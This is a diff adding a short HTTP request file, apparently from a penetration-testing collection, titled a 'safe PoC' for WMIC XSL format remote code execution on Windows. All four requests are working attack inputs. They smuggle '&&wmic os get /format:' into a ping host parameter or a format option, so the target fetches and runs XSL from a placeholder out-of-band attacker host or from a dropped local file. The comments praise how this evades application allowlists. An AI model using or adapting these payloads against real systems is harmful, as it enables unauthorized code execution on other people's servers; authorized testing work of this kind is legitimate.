@@ -1,0 +1,31 @@
+###
+# ============================================================================
+# Safe PoC -> x8bitranjit
+# WMIC XSL format-string RCE (Windows LOLBin) - .http battery.
+# Authorized testing only. Benign echo payload inside the XSL (this folder).
+#
+# WHY IT'S EXPERT: wmic is a SIGNED Windows binary that fetches AND EXECUTES
+# remote XSL via /FORMAT: - no script blocked by application allowlists, and
+# it doubles as an SSRF target (wmic performs the HTTP fetch itself).
+#
+# WHAT TO EDIT: target.com + the vulnerable parameter; YOUR-OOB-HOST.
+# ============================================================================
+
+### 1) via command-injection param (host param reaching cmd.exe)
+GET https://target.com/api/ping?host=127.0.0.1&&wmic+os+get+/format:%22http://wmic1.YOUR-OOB-HOST.example.invalid/poc.xsl%22 HTTP/1.1
+Host: target.com
+
+### 2) via argument-injection param (a 'format/template' option the app passes to wmic)
+GET https://target.com/api/sysinfo?format=http://wmic2.YOUR-OOB-HOST.example.invalid/poc.xsl HTTP/1.1
+Host: target.com
+
+### 3) local XSL after file-write primitive (traversal/upload landed the xsl)
+GET https://target.com/api/ping?host=127.0.0.1&&wmic+os+get+/format:C:%5Cwindows%5Ctemp%5Cpoc.xsl HTTP/1.1
+Host: target.com
+
+### 4) SSRF-angle proof only (wmic fetch = OOB callback, no exec claim)
+GET https://target.com/api/ping?host=127.0.0.1&&wmic+os+get+/format:%22http://wmic3.YOUR-OOB-HOST.example.invalid/probe%22 HTTP/1.1
+Host: target.com
+
+### CONFIRM: OOB callback from the target + (authorized) marker echo in the
+### wmic output. CLEANUP: remove served XSL (ledger).
